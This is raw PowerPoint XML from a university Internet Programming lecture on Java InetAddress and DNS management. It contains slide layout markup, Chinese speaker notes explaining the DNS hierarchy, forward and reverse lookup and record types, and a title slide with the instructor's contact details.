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111"/>
  </p:handoutMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="422" r:id="rId3"/>
    <p:sldId id="445" r:id="rId4"/>
    <p:sldId id="438" r:id="rId5"/>
    <p:sldId id="439" r:id="rId6"/>
    <p:sldId id="352" r:id="rId7"/>
    <p:sldId id="353" r:id="rId8"/>
    <p:sldId id="440" r:id="rId9"/>
    <p:sldId id="355" r:id="rId11"/>
    <p:sldId id="392" r:id="rId12"/>
    <p:sldId id="423" r:id="rId13"/>
    <p:sldId id="424" r:id="rId14"/>
    <p:sldId id="441" r:id="rId15"/>
    <p:sldId id="354" r:id="rId16"/>
    <p:sldId id="461" r:id="rId17"/>
    <p:sldId id="462" r:id="rId18"/>
    <p:sldId id="357" r:id="rId19"/>
    <p:sldId id="459" r:id="rId20"/>
    <p:sldId id="360" r:id="rId21"/>
    <p:sldId id="361" r:id="rId22"/>
    <p:sldId id="363" r:id="rId23"/>
    <p:sldId id="364" r:id="rId24"/>
    <p:sldId id="412" r:id="rId25"/>
    <p:sldId id="365" r:id="rId26"/>
    <p:sldId id="425" r:id="rId27"/>
    <p:sldId id="367" r:id="rId28"/>
    <p:sldId id="358" r:id="rId29"/>
    <p:sldId id="359" r:id="rId30"/>
    <p:sldId id="426" r:id="rId31"/>
    <p:sldId id="366" r:id="rId32"/>
    <p:sldId id="368" r:id="rId33"/>
    <p:sldId id="427" r:id="rId34"/>
    <p:sldId id="428" r:id="rId35"/>
    <p:sldId id="429" r:id="rId36"/>
    <p:sldId id="430" r:id="rId37"/>
    <p:sldId id="431" r:id="rId38"/>
    <p:sldId id="442" r:id="rId39"/>
    <p:sldId id="403" r:id="rId40"/>
    <p:sldId id="432" r:id="rId41"/>
    <p:sldId id="369" r:id="rId42"/>
    <p:sldId id="370" r:id="rId43"/>
    <p:sldId id="371" r:id="rId44"/>
    <p:sldId id="433" r:id="rId45"/>
    <p:sldId id="434" r:id="rId46"/>
    <p:sldId id="443" r:id="rId47"/>
    <p:sldId id="372" r:id="rId48"/>
    <p:sldId id="457" r:id="rId49"/>
    <p:sldId id="458" r:id="rId50"/>
    <p:sldId id="393" r:id="rId51"/>
    <p:sldId id="435" r:id="rId52"/>
    <p:sldId id="373" r:id="rId53"/>
    <p:sldId id="436" r:id="rId54"/>
    <p:sldId id="374" r:id="rId55"/>
    <p:sldId id="437" r:id="rId56"/>
    <p:sldId id="375" r:id="rId57"/>
    <p:sldId id="376" r:id="rId58"/>
    <p:sldId id="377" r:id="rId59"/>
    <p:sldId id="378" r:id="rId60"/>
    <p:sldId id="379" r:id="rId61"/>
    <p:sldId id="380" r:id="rId62"/>
    <p:sldId id="444" r:id="rId63"/>
    <p:sldId id="395" r:id="rId64"/>
    <p:sldId id="460" r:id="rId65"/>
    <p:sldId id="381" r:id="rId66"/>
    <p:sldId id="382" r:id="rId67"/>
    <p:sldId id="383" r:id="rId68"/>
    <p:sldId id="384" r:id="rId69"/>
    <p:sldId id="385" r:id="rId70"/>
    <p:sldId id="386" r:id="rId71"/>
    <p:sldId id="387" r:id="rId72"/>
    <p:sldId id="388" r:id="rId73"/>
    <p:sldId id="391" r:id="rId74"/>
    <p:sldId id="389" r:id="rId75"/>
    <p:sldId id="390" r:id="rId76"/>
    <p:sldId id="413" r:id="rId77"/>
    <p:sldId id="446" r:id="rId78"/>
    <p:sldId id="396" r:id="rId79"/>
    <p:sldId id="404" r:id="rId80"/>
    <p:sldId id="415" r:id="rId81"/>
    <p:sldId id="414" r:id="rId82"/>
    <p:sldId id="447" r:id="rId83"/>
    <p:sldId id="397" r:id="rId84"/>
    <p:sldId id="463" r:id="rId85"/>
    <p:sldId id="399" r:id="rId86"/>
    <p:sldId id="464" r:id="rId87"/>
    <p:sldId id="400" r:id="rId88"/>
    <p:sldId id="411" r:id="rId89"/>
    <p:sldId id="449" r:id="rId90"/>
    <p:sldId id="450" r:id="rId91"/>
    <p:sldId id="451" r:id="rId92"/>
    <p:sldId id="448" r:id="rId93"/>
    <p:sldId id="398" r:id="rId94"/>
    <p:sldId id="406" r:id="rId95"/>
    <p:sldId id="452" r:id="rId96"/>
    <p:sldId id="453" r:id="rId97"/>
    <p:sldId id="454" r:id="rId98"/>
    <p:sldId id="416" r:id="rId99"/>
    <p:sldId id="405" r:id="rId100"/>
    <p:sldId id="417" r:id="rId101"/>
    <p:sldId id="455" r:id="rId102"/>
    <p:sldId id="408" r:id="rId103"/>
    <p:sldId id="419" r:id="rId104"/>
    <p:sldId id="409" r:id="rId105"/>
    <p:sldId id="420" r:id="rId106"/>
    <p:sldId id="418" r:id="rId107"/>
    <p:sldId id="410" r:id="rId108"/>
    <p:sldId id="456" r:id="rId109"/>
    <p:sldId id="421" r:id="rId110"/>
  </p:sldIdLst>
  <p:sldSz cx="12192000" cy="6858000"/>
  <p:notesSz cx="7099300" cy="10234295"/>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0" userDrawn="1">
          <p15:clr>
            <a:srgbClr val="A4A3A4"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="2" pos="38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a:srgbClr val="CCFFFF"/>
    <a:srgbClr val="66FFFF"/>
    <a:srgbClr val="FF0066"/>
    <a:srgbClr val="006600"/>
    <a:srgbClr val="990099"/>
    <a:srgbClr val="FF3399"/>
    <a:srgbClr val="CC00CC"/>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39" autoAdjust="0"/>
    <p:restoredTop sz="94728" autoAdjust="0"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr showGuides="1">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="118" d="100"/>
          <a:sy n="118" d="100"/>
        </p:scale>
        <p:origin x="108" y="138"/>
      </p:cViewPr>
      <p:guideLst>
        <p:guide orient="horz" pos="2180"/>
        <p:guide pos="382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4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/tableStyles" Target="tableStyles.xml"/><Relationship Id="rId113" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/viewProps" Target="viewProps.xml"/><Relationship Id="rId112" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/presProps" Target="presProps.xml"/><Relationship Id="rId111" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/handoutMaster" Target="handoutMasters/handoutMaster1.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74755"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a:defRPr/>
            </a:pPr>
            <a:fld id="{2F431DBF-6AAA-4803-900C-A33FDAACB5F7}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="74756"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74757"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vl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{FCCE58DF-857C-402C-BA28-DCA23CB4D28A}"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71683"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defRPr sz="1300">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{F98262F1-4851-4E4A-82A0-2222170942DF}" type="datetime1">
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="307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5"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1686"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71687"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defRPr sz="1300"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{71ACC9A6-D882-4684-865A-D47DEDDD347B}"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讲解</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>层级结构：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>比如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>（根）</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>➜</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> .com </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>➜</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> google.com </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>这样的分级命名系统。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>讲解正向</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>反向解析（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>forward/reverse lookup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>）：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>正向：域名</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>➜</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>地址（如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> www.google.com </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>➜</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> 142.250.72.196</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>反向：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>地址</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>➜</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>域名（如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> 142.250.72.196 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>➜</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> google.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>讲解常见的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> DNS </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>记录类型：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>A</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>IPv4 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>地址（如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> www.example.com </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>➜</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> 192.168.1.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>AAAA</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>：</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>IPv6 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>地址（如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> www.example.com </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>➜</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> 2001:db8::1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>PTR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>：用于反向解析的记录（</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US"/>
              <a:t>➜</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>域名）</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实例方法和静态方法，</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>Getter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>方法</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xfrm>
            <a:off x="139700" y="768350"/>
            <a:ext cx="6819900" cy="3836988"/>
          </a:xfrm>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29699" name="备注占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US">
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29700" name="灯片编号占位符 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="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2FCB037-F1D6-4418-B68F-18E902988F28}"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1ACC9A6-D882-4684-865A-D47DEDDD347B}"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1ACC9A6-D882-4684-865A-D47DEDDD347B}"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69634" name="Rectangle 2"/>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a:t>单击此处编辑母版标题样式</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="69635" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noRot="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1828800" y="3886200"/>
            <a:ext cx="8534400" cy="1752600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">
              <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
              <a:buNone/>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" noProof="0"/>
              <a:t>单击此处编辑母版副标题样式</a:t>
            </a:r>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DC195D6-2AB6-4016-BCBD-1F8EE05B6A67}"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5370F98-A69C-4A31-93A8-A7513EEFDFA8}"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82B01BE-0649-4318-98C5-356040BDEDCD}"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02168"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1"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4C9812B0-DC5E-490F-ADE1-1C3B1A6E1528}"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CA5572F9-5589-4302-A0F1-20B6B0812487}"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2FE04CFF-FF55-440D-90D0-7976885E8118}"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044B3544-4017-4840-ADCA-E1F247AFEA33}"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43D8DBB6-6BC2-4AD6-8128-403B9DFE143C}"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97569D3C-0FE2-481B-ACEB-E900C12A80EA}"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675D0A7-31CA-4BE9-98D3-0AB399DD4668}"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2918" y="228601"/>
            <a:ext cx="2846916" cy="58705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02167" y="228601"/>
            <a:ext cx="8337551" cy="58705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752CDB2-C99D-4981-9307-48E29B1F7707}"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228600"/>
            <a:ext cx="1138766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02168" y="1600200"/>
            <a:ext cx="5592233" cy="44989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1" y="1600200"/>
            <a:ext cx="5592233" cy="44989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6052A6F-801D-4872-891D-7F175069385D}"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402167" y="228600"/>
            <a:ext cx="1138766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Rot="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="402167" y="1600200"/>
            <a:ext cx="11387667"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8612" name="Rectangle 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="402167"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a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68613"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a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>CSASC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="68614" name="Rectangle 6"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8737601"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lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{ADFEA2F7-7AD0-41A1-A8C8-2830FFF528B9}"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hyperlink" Target="mailto:baskerg@szu.edu.c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hyperlink" Target="http://www.oreilly.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5.pn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hyperlink" Target="http://www.google.com/"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2983944"/>
            <a:ext cx="10058400" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CH5 and CH6</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="002060"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t>InetAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="002060"/>
                </a:solidFill>
              </a:rPr>
              <a:t> and DNS Management</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="002060"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="TextBox 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1562100" y="4953000"/>
            <a:ext cx="9067800" cy="1569660"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>BASKER GEORGE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>College of Computer Science and Software Engineering</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>EMAIL: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0">
                <a:hlinkClick r:id="rId1"/>
              </a:rPr>
              <a:t>baskerg@szu.edu.cn</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Office: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>致腾楼计算机与软件学院</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>826 </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="12" name="Picture 10" descr="sz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13021"/>
            <a:ext cx="3581400" cy="1594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p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3079675" y="1843251"/>
            <a:ext cx="5727850" cy="1015663"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0" algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-GB" altLang="en-US" sz="6000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="华文行楷" panose="02010800040101010101" pitchFamily="2" charset="-122"/>
                <a:ea typeface="华文行楷" panose="02010800040101010101" pitchFamily="2" charset="-122"/>
              </a:rPr>
              <a:t>Internet Programming</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="6000" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
              <a:latin typeface="华文行楷" panose="02010800040101010101" pitchFamily="2" charset="-122"/>
              <a:ea typeface="华文行楷" panose="0201080004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74319"/>
            <a:ext cx="11387667" cy="1143000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Objective of this Chapter:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Slide Number Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{2FE04CFF-FF55-440D-90D0-7976885E8118}" type="slidenum">
              <a:rPr lang="en-US" altLang="zh-CN" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="304800" y="2209800"/>
            <a:ext cx="11658600" cy="2062103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>To equip students with the skills to programmatically manage network addresses, DNS resolution, and security in Java applications, while emphasizing real-world use cases and best practices.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0070C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167" y="228600"/>
            <a:ext cx="11387667" cy="914400"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="5400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Course Content</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="5400" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>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
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rectangle 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="402166" y="1371600"/>
            <a:ext cx="11388725" cy="5029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r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>1. Internet Address Concepts</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" eaLnBrk="1" hangingPunct="1">
              <a:buNone/>
            </a:pPr>
            <a:r>
